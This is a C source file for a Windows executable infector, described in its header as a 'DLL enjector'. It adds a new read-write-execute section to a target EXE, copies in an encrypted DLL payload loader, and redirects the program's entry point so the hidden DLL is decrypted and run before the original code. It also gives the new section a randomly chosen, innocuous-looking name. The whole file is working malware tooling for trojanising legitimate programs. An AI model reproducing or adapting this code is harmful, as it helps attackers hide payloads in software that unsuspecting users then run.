/*
	DLL enjector for enject DLL in EXE file. When EXE starts, decrypt and running DLL
	By Solodov A. N. aka SANshine aka Paketov aka Antichrist aka CatsEater aka KittyEater aka UniverseFucker
	2026
*/

#include <stdint.h>

#include <Windows.h>
#include <Shlwapi.h>
#include <winternl.h>
#include <commctrl.h>
#include <stdio.h>

#include "main.h"
#include "Settings.h"
#include "XTea.h"
#include "PayloadLoader.h"


//#pragma comment(linker, "/section:.etg,WRSE")
#ifdef _WIN64
//# pragma comment(linker, "/BASE:0x140000000")
#else

#endif



#ifndef _DEBUG
# ifdef EP_IS_CONSOLE
//#  pragma comment(linker, "/ENTRY:\"main\"")
# else
//#  pragma comment(linker, "/ENTRY:\"wWinMain\"")
# endif

# pragma optimize("gsy",on)
# pragma comment(linker,"/merge:.rdata=.data")
# pragma comment(linker,"/merge:.text=.data")

# pragma comment(linker,"/SECTION:.data,RWE")



#endif

#pragma comment(linker, "/ENTRY:\"main\"")
//#pragma comment(linker, "/DYNAMICBASE:NO")

#ifdef EP_IS_64_BIT_PAYLOAD
# ifndef _WIN64
#  error "Target PE and paylod have different arch: payload is 64bit image and target image is 32bit"
# endif
#else
# ifdef _WIN64
#  error "Target PE and paylod have different arch: payload is 32bit image and target image is 64bit"
# endif
#endif


static DWORD AllocCodeSectionInPE(
	char** srcPe,
	LPDWORD PeSize,
	DWORD InjectCodeSize
);
static void *ep_memmove(void *dest, const void *src, size_t n);
static BOOL isPE32(char* image_base);

//unsigned char x64_ep_get_addr_data[] = {
//	//start:
//	0xE8, 0x00, 0x00, 0x00, 0x00, //call $+5
//	0x58,						  //pop RAX
//	0x48, 0xBB, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,//mov RBX, start + 5
//	0x48, 0x29, 0xD8,			  //sub RAX, RBX
//	0x48, 0x01, 0xC8,			  //add RAX, RCX
//	//0x48, 0x03, 0x44, 0x24, 0x08, //add RAX, [RSP+8] //RAX = RAX + Addr 
//	0xC3						  //retn
//};

unsigned char x86_entry_point_caller[] = {
	0xE8, 0x00, 0x00, 0x00, 0x00, //call <MapAndRunDll>
	0xE9, 0x00, 0x00, 0x00, 0x00  //jmp <Original_entry_point>
};

unsigned char x64_entry_point_caller[] = {
	/* 
		If dll running from another dll then save registers 
			BOOL WINAPI DllMain(
				HINSTANCE hinstDLL,
				DWORD fdwReason,
				LPVOID lpvReserved
			)
	*/
	0x51,						  //push rcx	;hinstDLL
	0x52,						  //push rdx	;fdwReason
	0x41, 0x50,					  //push r8		;lpReserved
	0xE8, 0x00, 0x00, 0x00, 0x00, //call <MapAndRunDll>
	0x41, 0x58,					  //pop r8
	0x5A,						  //pop rdx
	0x59,						  //pop rcx
	0xE9, 0x00, 0x00, 0x00, 0x00  //jmp <Original_entry_point>
};

static int ep_strcmp(const char* str1, const char* str2) {
	register const char* a = str1;
	register const char* b = str2;
	while ('\0' != *a && *a == *b) {
		a++;
		b++;
	}
	return (uint8_t)(*a) - (uint8_t)(*b);
}

static void *ep_memmove(void *dest, const void *src, size_t n) {
	unsigned char *pd = (unsigned char *)dest;
	const unsigned char *ps = (unsigned char *)src;
	if (ps < pd)
		for (pd += n, ps += n; n--;)
			*--pd = *--ps;
	else
		while (n--)
			*pd++ = *ps++;
	return dest;
}

int main() {
	///////////////////////////////////////////////////////////////////
	char* CurModule = (char*)GetModuleHandleW(NULL);
	int NumArgs = 0;
	LPWSTR* Argv = CommandLineToArgvW(GetCommandLineW(), &NumArgs);

	if (NumArgs < 3) {
		WriteConsoleW(
			GetStdHandle(STD_ERROR_HANDLE),
			L"Error: need source exe and dest exe argument\noutput.exe <source exe> <dest exe>\n",
			(sizeof(L"Error: need source exe and dest exe argument\noutput.exe <source exe> <dest exe>\n") / sizeof(WCHAR)) - sizeof(WCHAR),
			NULL,
			NULL
		);
		return 1;
	}
	BY_HANDLE_FILE_INFORMATION info;
	DWORD ReadedFileSize;
	DWORD SrcPeSize;

	HANDLE SrcFile = CreateFileW(
		Argv[1],
		GENERIC_READ,
		FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL
	);

	if ((SrcFile == NULL) || (SrcFile == INVALID_HANDLE_VALUE)) {
		WriteConsoleW(
			GetStdHandle(STD_ERROR_HANDLE),
			L"Error: source exe not opened\n",
			(sizeof(L"Error: source exe not opened\n") / sizeof(WCHAR)) - sizeof(WCHAR),
			NULL,
			NULL
		);
		return 1;
	}

	GetFileInformationByHandle(SrcFile, &info);
	char* TargetBaseAddr = HeapAlloc(GetProcessHeap(), 0, info.nFileSizeLow);
	ReadedFileSize = 0;
	ReadFile(SrcFile, TargetBaseAddr, info.nFileSizeLow, &ReadedFileSize, NULL);
	if (ReadedFileSize < info.nFileSizeLow) {
		WriteConsoleW(
			GetStdHandle(STD_ERROR_HANDLE),
			L"Error: source exe not readed\n",
			(sizeof(L"Error: source exe not readed\n") / sizeof(WCHAR)) - sizeof(WCHAR),
			NULL,
			NULL
		);
		return 1;
	}
	CloseHandle(SrcFile);
	if (isPE32(TargetBaseAddr)) {
#ifdef _WIN64
		WriteConsoleW(
			GetStdHandle(STD_ERROR_HANDLE),
			L"Target PE and paylod have different arch: payload is 64bit image and target image is 32bit\n\r",
			(sizeof(L"Target PE and paylod have different arch: payload is 64bit image and target image is 32bit\n\r") / sizeof(WCHAR)) - sizeof(WCHAR),
			NULL,
			NULL
		);
		return 1;
#endif
	} else {
#ifndef _WIN64
		WriteConsoleW(
			GetStdHandle(STD_ERROR_HANDLE),
			L"Target PE and paylod have different arch: payload is 32bit image and target image is 64bit\n\r",
			(sizeof(L"Target PE and paylod have different arch: payload is 32bit image and target image is 64bit\n\r") / sizeof(WCHAR)) - sizeof(WCHAR),
			NULL,
			NULL
		);
		return 1;
#endif
	}


	SrcPeSize = ReadedFileSize;
	HANDLE DstFile = CreateFileW(
		Argv[2],
		GENERIC_WRITE | GENERIC_READ,
		FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
		NULL,
		CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL,
		NULL
	);
	if ((DstFile == NULL) || (DstFile == INVALID_HANDLE_VALUE)) {
		WriteConsoleW(
			GetStdHandle(STD_ERROR_HANDLE),
			L"Error: target exe not opened\n",
			(sizeof(L"Error: target exe not opened\n") / sizeof(WCHAR)) - sizeof(WCHAR),
			NULL,
			NULL
		);
		return 1;
	}


#ifdef _WIN64
	PIMAGE_NT_HEADERS64 ImageNtHeaders = (PIMAGE_NT_HEADERS64)(CurModule + ((PIMAGE_DOS_HEADER)CurModule)->e_lfanew);
#else
	PIMAGE_NT_HEADERS32 ImageNtHeaders = (PIMAGE_NT_HEADERS32)(CurModule + ((PIMAGE_DOS_HEADER)CurModule)->e_lfanew);
#endif

	PIMAGE_SECTION_HEADER Sections = (PIMAGE_SECTION_HEADER)(ImageNtHeaders + 1);
	PIMAGE_SECTION_HEADER VtxtSection = NULL;
	//ImageNtHeaders->OptionalHeader.Win32VersionValue
	for (int i = 0; i < ImageNtHeaders->FileHeader.NumberOfSections; i++) {
		PIMAGE_SECTION_HEADER CurSection = Sections + i;
		if (ep_strcmp(CurSection->Name, ".vtxt") == 0) {
			VtxtSection = CurSection;
			break;
		}
	}
	if (VtxtSection == NULL) {
		WriteConsoleW(
			GetStdHandle(STD_ERROR_HANDLE),
			L"Error: current exe not have .vtxt section\n",
			(sizeof(L"Error: current exe not have .vtxt section\n") / sizeof(WCHAR)) - sizeof(WCHAR),
			NULL,
			NULL
		);
		return 1;
	}

	DWORD VtxtSizeSection = (VtxtSection->Misc.VirtualSize) ? VtxtSection->Misc.VirtualSize : VtxtSection->SizeOfRawData;
	DWORD NewSection = AllocCodeSectionInPE(&TargetBaseAddr, &SrcPeSize, VtxtSizeSection);
	if (NewSection == ((DWORD)-1)) {
		WriteConsoleW(
			GetStdHandle(STD_ERROR_HANDLE),
			L"Error: not create section in dest exe file\n",
			(sizeof(L"Error: not create section in dest exe file\n") / sizeof(WCHAR)) - sizeof(WCHAR),
			NULL,
			NULL
		);
		return 1;
	}
#ifdef _WIN64
	PIMAGE_NT_HEADERS64 DestImageNtHeaders = (PIMAGE_NT_HEADERS64)(TargetBaseAddr + ((PIMAGE_DOS_HEADER)TargetBaseAddr)->e_lfanew);
#else
	PIMAGE_NT_HEADERS32 DestImageNtHeaders = (PIMAGE_NT_HEADERS32)(TargetBaseAddr + ((PIMAGE_DOS_HEADER)TargetBaseAddr)->e_lfanew);
#endif
	PIMAGE_SECTION_HEADER DestSections = (PIMAGE_SECTION_HEADER)(DestImageNtHeaders + 1);

	/* Copy .vtxt section from current running EXE in dest PE */
	ep_memcpy(
		TargetBaseAddr + DestSections[NewSection].PointerToRawData, 
		CurModule + VtxtSection->VirtualAddress,
		VtxtSizeSection
	);
#ifdef _WIN64
	*((INT32*)&(x64_entry_point_caller[1 + 4])) = ((char*)MapAndRunDll) - ((char*)EntryPoint) - (5 + 4);

	DWORD OffsetEntryPointInSection = ((char*)EntryPoint) - (CurModule + VtxtSection->VirtualAddress);
	DWORD NewEntryPoint = DestSections[NewSection].VirtualAddress + OffsetEntryPointInSection;
	*((INT32*)&x64_entry_point_caller[5 + 1 + 4 + 4]) = ((INT32)DestImageNtHeaders->OptionalHeader.AddressOfEntryPoint) - ((INT32)NewEntryPoint) - (10 + 4 + 4);
	DestImageNtHeaders->OptionalHeader.AddressOfEntryPoint = NewEntryPoint;
	DestImageNtHeaders->OptionalHeader.CheckSum = 0;

	/* Copy entry point caller */
	ep_memcpy(
		TargetBaseAddr + DestSections[NewSection].PointerToRawData + OffsetEntryPointInSection,
		x64_entry_point_caller,
		sizeof(x64_entry_point_caller)
	);
#else
	*((INT32*)&(x86_entry_point_caller[1])) = ((char*)MapAndRunDll) - ((char*)EntryPoint) - 5;

	DWORD OffsetEntryPointInSection = ((char*)EntryPoint) - (CurModule + VtxtSection->VirtualAddress);
	DWORD NewEntryPoint = DestSections[NewSection].VirtualAddress + OffsetEntryPointInSection;
	*((INT32*)&x86_entry_point_caller[6]) = ((INT32)DestImageNtHeaders->OptionalHeader.AddressOfEntryPoint) - ((INT32)NewEntryPoint) - 10;
	DestImageNtHeaders->OptionalHeader.AddressOfEntryPoint = NewEntryPoint;
	DestImageNtHeaders->OptionalHeader.CheckSum = 0;

	/* Copy entry point caller */
	ep_memcpy(
		TargetBaseAddr + DestSections[NewSection].PointerToRawData + OffsetEntryPointInSection,
		x86_entry_point_caller,
		sizeof(x86_entry_point_caller)
	);
#endif
	DWORD Written = 0;
	WriteFile(DstFile, TargetBaseAddr, SrcPeSize, &Written, NULL);
	CloseHandle(DstFile);
	if(Written == ((DWORD)-1))
		EntryPoint();
	return 0;
}

#define align_up(value, alignment) (((value) + (alignment) - 1) & ~((alignment) - 1))
#define Get_DosHeader_ImageHeaders_Sections(srcPE) {\
	DosHeader = (PIMAGE_DOS_HEADER)(srcPE); \
	ImageNtHeaders = (((char*)(srcPE)) + DosHeader->e_lfanew);\
	Sections = ImageNtHeaders + 1; \
}

static DWORD AllocCodeSectionInPE(
	char** srcPe,
	LPDWORD PeSize,
	DWORD InjectCodeSize
) {
	char* srcPE = *srcPe;
	PIMAGE_DOS_HEADER DosHeader;
#ifdef _WIN64
	PIMAGE_NT_HEADERS64 ImageNtHeaders;
#else
	PIMAGE_NT_HEADERS32 ImageNtHeaders;
#endif
	PIMAGE_SECTION_HEADER Sections;
	Get_DosHeader_ImageHeaders_Sections(srcPE);
	//Check if file for enject has 32bit or 64bit image 
	if (
		(DosHeader->e_magic != IMAGE_DOS_SIGNATURE) ||
		(DosHeader->e_lfanew <= 0) ||
		((DosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS32) + sizeof(IMAGE_DOS_HEADER)) >= *PeSize) ||
		(ImageNtHeaders->Signature != 0x00004550) || //"PE"
		((ImageNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR].VirtualAddress != 0) && //Is .net
		(ImageNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR].Size != 0))             //Is .net
	) {
		return (DWORD)-1;
	}
	if (DosHeader->e_lfanew > (sizeof(IMAGE_SECTION_HEADER) + sizeof(IMAGE_DOS_HEADER))) {
		DosHeader->e_lfanew -= sizeof(IMAGE_SECTION_HEADER);
		ep_memmove(((char*)ImageNtHeaders) - sizeof(IMAGE_SECTION_HEADER), ImageNtHeaders, sizeof(*ImageNtHeaders) + ImageNtHeaders->FileHeader.NumberOfSections * sizeof(IMAGE_SECTION_HEADER));
		Get_DosHeader_ImageHeaders_Sections(srcPE);
	}

	DWORD inj_size = InjectCodeSize;
	DWORD IndexNewSection = ImageNtHeaders->FileHeader.NumberOfSections;
	ImageNtHeaders->FileHeader.NumberOfSections++;
	ep_memset(Sections + IndexNewSection, 0, sizeof(Sections[IndexNewSection]));
	uint32_t Rand = ((DWORD)(__rdtsc() & 0x7fffffff)) % 3;
	if (Rand == 0) {
		((DWORD*)&(Sections[IndexNewSection].Name[0]))[0] = *((DWORD*)".t\0\0");
	} else if (Rand == 1) {
		((DWORD*)&(Sections[IndexNewSection].Name[0]))[0] = *((DWORD*)".gte");
		((DWORD*)&(Sections[IndexNewSection].Name[0]))[1] = *((DWORD*)"xt\0\0");
	} else if (Rand == 2) {
		((DWORD*)&(Sections[IndexNewSection].Name[0]))[0] = *((DWORD*)".fte");
		((DWORD*)&(Sections[IndexNewSection].Name[0]))[1] = *((DWORD*)"xt\0\0");
	}

	Sections[IndexNewSection].VirtualAddress = Sections[IndexNewSection - 1].VirtualAddress + align_up(((Sections[IndexNewSection - 1].Misc.VirtualSize) ? Sections[IndexNewSection - 1].Misc.VirtualSize : Sections[IndexNewSection - 1].SizeOfRawData), ImageNtHeaders->OptionalHeader.SectionAlignment);
	Sections[IndexNewSection].PointerToRawData = Sections[IndexNewSection - 1].PointerToRawData + Sections[IndexNewSection - 1].SizeOfRawData;
	Sections[IndexNewSection].Misc.VirtualSize = inj_size;
	Sections[IndexNewSection].SizeOfRawData = align_up(inj_size, ImageNtHeaders->OptionalHeader.FileAlignment);
	Sections[IndexNewSection].Characteristics = IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_EXECUTE;
	ImageNtHeaders->OptionalHeader.SizeOfImage = Sections[IndexNewSection].VirtualAddress + align_up((Sections[IndexNewSection].Misc.VirtualSize) ? Sections[IndexNewSection].Misc.VirtualSize : Sections[IndexNewSection].SizeOfRawData, ImageNtHeaders->OptionalHeader.SectionAlignment);

	*srcPe = srcPE = HeapReAlloc(GetProcessHeap(), 0, srcPE, *PeSize += Sections[IndexNewSection].SizeOfRawData);
	Get_DosHeader_ImageHeaders_Sections(srcPE);
	ep_memmove(
		srcPE + Sections[IndexNewSection].PointerToRawData + Sections[IndexNewSection].SizeOfRawData,
		srcPE + Sections[IndexNewSection].PointerToRawData,
		*PeSize - (Sections[IndexNewSection].PointerToRawData + Sections[IndexNewSection].SizeOfRawData)
	);
	ep_memset(srcPE + Sections[IndexNewSection].PointerToRawData, 0, Sections[IndexNewSection].SizeOfRawData);
	//(srcPE + Sections[IndexNewSection].PointerToRawData)[0] = 0xfA;
	return IndexNewSection;
}

#define OPTIONAL_HEADER_MAGIC_PE32 0x10b
#define OPTIONAL_HEADER_MAGIC_PE64 0x20b

static BOOL isPE32(char* image_base) {
	PIMAGE_NT_HEADERS32 NtHeaders = image_base + ((PIMAGE_DOS_HEADER)image_base)->e_lfanew;
	return NtHeaders->OptionalHeader.Magic == OPTIONAL_HEADER_MAGIC_PE32;
}
